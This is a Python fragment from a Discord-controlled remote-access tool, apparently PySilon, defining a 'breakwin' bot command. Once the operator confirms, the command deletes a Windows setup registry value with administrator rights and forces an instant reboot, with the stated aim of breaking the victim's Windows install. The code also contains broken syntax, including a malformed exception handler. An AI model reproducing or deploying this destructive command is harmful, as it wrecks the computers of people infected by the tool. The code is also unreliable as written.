#<imports>
import subprocess
import asyncio
#</imports>

@client.command(name='breakwin')
async def break_windows(ctx):
    await ctx.message.delete()
    try:
        if IsAdmin():
            reaction_msg = await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                title='üü£ System',
                description=f'```Are you sure you want to {render_text('completely break')} Windows?```',
                color=0xa020f0,
                footer=['Please ‚≠ê our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
            await reaction_msg.add_reaction('‚úÖ'); await reaction_msg.add_reaction('‚ùå')
            def win_break_confirm(reaction, user):
                return str(reaction.emoji) in ['‚úÖ', '‚ùå'] and user == ctx.author
            try:
                reaction, user = await client.wait_for('reaction_add', check=win_break_confirm)
                if str(reaction.emoji) == '‚úÖ':
                    await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                        title='üü¢ Executing',
                        description=f'```{render_text('Break Windows')} will now be {render_text('executed')}. Bye bye!```',
                        color=0x00ff00,
                        footer=['Please ‚≠ê our repository if you enjoy'],
                        author=[DEFAULT, DEFAULT]))
                    subprocess.run(['reg', 'delete', 'HKLM\\SYSTEM\\Setup', '/v', 'SetupType', '/f'], check=True)
                    subprocess.run(['shutdown', '/r', '/f', '/t', '0'], check=True)
                else: return await ctx.send("```‚ùó Cancelled by user.```")
            except: asyncio.TimeoutError: await ctx.send("```‚ùó Reaction listener has timed out.```")
        else:
            await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                title='üìõ Error',
                description=f'```{render_text('PySilon')} is not running as {render_text('admin')}!```',
                color=0x00ff00,
                footer=['Please ‚≠ê our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
    except:
        await self.get_channel(self.channel_id).send(embed=self.generate_embed(
            title='üìõ Error',
            description=f'```An error occurred during {render_text('windows break')}.```',
            color=0x00ff00,
            footer=['Please ‚≠ê our repository if you enjoy'],
            author=[DEFAULT, DEFAULT]))